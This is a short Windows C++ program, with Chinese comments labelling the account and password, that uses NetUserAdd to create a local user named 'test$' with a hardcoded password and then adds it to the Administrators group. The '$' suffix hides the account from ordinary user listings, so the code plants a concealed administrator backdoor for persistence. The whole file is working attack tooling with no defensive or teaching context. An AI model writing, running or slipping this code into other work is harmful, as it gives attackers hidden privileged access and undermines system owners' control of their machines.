#include "stdafx.h"
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib,"netapi32")

#include  <stdio.h>
#include  <windows.h>
#include  <lm.h>


int wmain(int argc, wchar_t *argv[])
{
	
	USER_INFO_1 UserInfo;
	DWORD dwLevel = 1;
	DWORD dwError = 0;

	UserInfo.usri1_name = L"test$";            // 账户    
	UserInfo.usri1_password = L"Test@#123";      // 密码
	UserInfo.usri1_priv = USER_PRIV_USER;
	UserInfo.usri1_home_dir = NULL;
	UserInfo.usri1_comment = NULL;
	UserInfo.usri1_flags = UF_SCRIPT;
	UserInfo.usri1_script_path = NULL;

	
	NetUserAdd(NULL, dwLevel, (LPBYTE)&UserInfo, &dwError);

	
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = UserInfo.usri1_name;
	NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);

	return 0;
}
